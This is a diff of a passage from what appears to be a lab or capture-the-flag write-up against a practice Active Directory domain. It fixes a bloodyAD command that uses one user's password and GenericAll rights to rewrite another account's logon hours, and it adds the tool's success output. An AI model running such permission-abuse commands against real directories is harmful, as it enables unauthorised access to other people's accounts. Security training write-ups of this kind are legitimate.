@@ -605,5 +605,13 @@ Interesting error
 But with GenericAll over `oscar.m` i should be able to change the logon hours as `bogdan.r`
 
 ```python
-blodyAD --host sg-dc01.shadowgate.local -d shadowgate.local -u bogdan.r -p 'Password123!' set object oscar.m logonhours -v '////////////////////////////' --b64
+bloodyAD --host sg-dc01.shadowgate.local -d shadowgate.local -u bogdan.r -p 'bogdan0126' set object oscar.m logonhours -v '////////////////////////////' --b64
+[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
+[+] oscar.m's logonHours has been updated
+```
+
+Now his hourse are updated i should be able to logon
+
+```python
+
 ```
